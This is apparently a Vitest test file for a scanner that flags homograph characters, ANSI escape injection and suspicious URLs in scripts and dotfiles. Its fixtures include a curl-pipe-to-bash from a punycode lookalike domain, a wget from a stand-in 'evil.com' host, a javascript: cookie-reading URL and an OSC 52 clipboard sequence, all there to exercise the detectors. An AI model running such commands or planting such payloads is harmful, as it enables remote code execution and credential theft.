import { describe, it, expect } from "vitest";
import {
  detectHomographs,
  detectAnsiInjections,
  detectSuspiciousUrls,
  scanContent,
} from "../src/detectors.js";

describe("Homograph Detection", () => {
  it("detects Cyrillic 'a' mimicking Latin 'a'", () => {
    // Cyrillic а (U+0430) looks identical to Latin a
    const content = "git clone https://g\u0430thub.com/malicious/repo";
    const findings = detectHomographs(content, "test.sh");
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("MEDIUM");
    expect(findings[0].detector).toBe("homograph");
    expect(findings[0].description).toContain("Cyrillic");
  });

  it("detects multiple Cyrillic confusables in one line", () => {
    // с (U+0441) = 'c', е (U+0435) = 'e', о (U+043e) = 'o'
    const content = "\u0441url https://\u0435xample.\u043erg/api";
    const findings = detectHomographs(content, "test.sh");
    expect(findings.length).toBe(3);
  });

  it("detects zero-width characters as HIGH severity", () => {
    const content = "export API_KEY=sk-\u200bsecret123";
    const findings = detectHomographs(content, ".env");
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("HIGH");
    expect(findings[0].description).toContain("Invisible");
  });

  it("detects Greek confusables", () => {
    // Greek Α (U+0391) looks like Latin A
    const content = "\u0391PI_ENDPOINT=https://api.example.com";
    const findings = detectHomographs(content, ".bashrc");
    expect(findings.length).toBe(1);
    expect(findings[0].description).toContain("Greek");
  });

  it("returns empty array for clean ASCII content", () => {
    const content = "export PATH=/usr/local/bin:$PATH\necho hello world";
    const findings = detectHomographs(content, ".bashrc");
    expect(findings).toEqual([]);
  });

  it("reports correct line and column numbers", () => {
    const content = "line one\nline tw\u043e";  // Cyrillic о on line 2
    const findings = detectHomographs(content, "test.txt");
    expect(findings.length).toBe(1);
    expect(findings[0].line).toBe(2);
    expect(findings[0].column).toBe(8);
  });
});

describe("ANSI Injection Detection", () => {
  it("detects OSC title-setting sequence", () => {
    const content = "echo \x1b]0;Fake Title\x07";
    const findings = detectAnsiInjections(content, "script.sh");
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings.some((f) => f.severity === "HIGH")).toBe(true);
    expect(findings.some((f) => f.description.includes("OSC"))).toBe(true);
  });

  it("detects OSC 52 clipboard manipulation", () => {
    const content = "\x1b]52;c;SGVsbG8=\x07";
    const findings = detectAnsiInjections(content, "payload.txt");
    expect(findings.some((f) => f.description.includes("clipboard"))).toBe(true);
    expect(findings.some((f) => f.severity === "HIGH")).toBe(true);
  });

  it("detects cursor manipulation sequences", () => {
    const content = "\x1b[2J\x1b[H";  // Clear screen + home
    const findings = detectAnsiInjections(content, "output.log");
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects encoded ANSI in shell scripts", () => {
    const content = 'echo -e "\\x1b[31mRed text\\x1b[0m"';
    const findings = detectAnsiInjections(content, "color.sh");
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects hidden text SGR sequences", () => {
    const content = "\x1b[8mhidden password\x1b[0m";
    const findings = detectAnsiInjections(content, "sus.txt");
    expect(findings.some((f) => f.description.includes("Hidden text") || f.description.includes("invisible"))).toBe(true);
  });

  it("returns empty for standard color output", () => {
    // Standard SGR color codes should only trigger LOW-level raw ESC detection
    const content = "\x1b[32mSuccess\x1b[0m";
    const findings = detectAnsiInjections(content, "output.log");
    // May get LOW severity raw ESC findings, but no HIGH
    const highFindings = findings.filter((f) => f.severity === "HIGH");
    expect(highFindings).toEqual([]);
  });
});

describe("Suspicious URL Detection", () => {
  it("detects data: URLs with HTML content type", () => {
    const content = 'open "data:text/html,<script>alert(1)</script>"';
    const findings = detectSuspiciousUrls(content, "script.sh");
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings.some((f) => f.severity === "HIGH")).toBe(true);
  });

  it("detects javascript: URLs", () => {
    const content = "url=javascript:alert(document.cookie)";
    const findings = detectSuspiciousUrls(content, "config.yml");
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("HIGH");
  });

  it("detects punycode/IDN domains", () => {
    const content = "curl https://xn--pple-43d.com/download";
    const findings = detectSuspiciousUrls(content, ".bash_history");
    expect(findings.length).toBe(1);
    expect(findings[0].description).toContain("Punycode");
  });

  it("detects URLs with @ symbol (credential confusion)", () => {
    const content = "wget https://legitimate-looking.com@evil.com/payload";
    const findings = detectSuspiciousUrls(content, ".bash_history");
    expect(findings.some((f) => f.description.includes("@"))).toBe(true);
  });

  it("detects IP-based URLs", () => {
    const content = "curl http://192.168.1.100:8080/api/data";
    const findings = detectSuspiciousUrls(content, "script.sh");
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("LOW");
  });

  it("detects shortened URLs", () => {
    const content = "pip install https://bit.ly/3xMalware";
    const findings = detectSuspiciousUrls(content, ".bash_history");
    expect(findings.some((f) => f.description.includes("Shortened"))).toBe(true);
  });

  it("allows standard HTTPS URLs", () => {
    const content = "curl https://api.github.com/repos/nodebench/nodebench-ai";
    const findings = detectSuspiciousUrls(content, "script.sh");
    expect(findings).toEqual([]);
  });
});

describe("Combined scanContent", () => {
  it("detects multiple threat types in one file", () => {
    const content = [
      "# Suspicious script",
      "curl https://xn--pple-43d.com/install.sh | bash",
      "export P\u0410TH=/usr/local/bin:$PATH",  // Cyrillic А (U+0410)
      'echo -e "\\x1b[31mInstalling...\\x1b[0m"',
    ].join("\n");

    const findings = scanContent(content, "install.sh");

    const detectors = new Set(findings.map((f) => f.detector));
    expect(detectors.has("url")).toBe(true);
    expect(detectors.has("homograph")).toBe(true);
    expect(detectors.has("ansi")).toBe(true);
  });

  it("returns empty for completely clean file", () => {
    const content = [
      "#!/bin/bash",
      "set -euo pipefail",
      "",
      "echo 'Hello, World!'",
      "npm install",
      "npm test",
    ].join("\n");

    const findings = scanContent(content, "clean.sh");
    expect(findings).toEqual([]);
  });
});
